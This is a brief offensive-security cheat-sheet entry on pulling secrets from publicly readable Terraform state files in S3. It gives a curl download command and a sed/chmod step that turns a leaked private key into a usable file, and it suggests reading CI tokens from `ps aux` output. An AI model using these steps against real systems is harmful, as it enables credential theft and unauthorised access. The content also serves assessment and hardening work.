# Public S3 Terraform State Secret Leak

A `terraform { backend "s3" {...} }` block names the exact bucket/key holding the state file — if that bucket is public, the state (often containing provisioned SSH private keys, DB passwords, and other resource attributes in plaintext) is a direct download:

```bash
curl http://<bucket>.s3.amazonaws.com/<key-path>/terraform.tfstate
# look for "private_key" / password fields inside the JSON; literal \n needs unescaping:
cat id_rsa | sed 's/\\n/\n/g' > fixed_id_rsa && chmod 600 fixed_id_rsa
```
If the environment runs Atlantis/similar CI automation, check running processes for leaked tokens too — `ps aux` on a box that runs it often shows the automation's own API token in its command-line args.
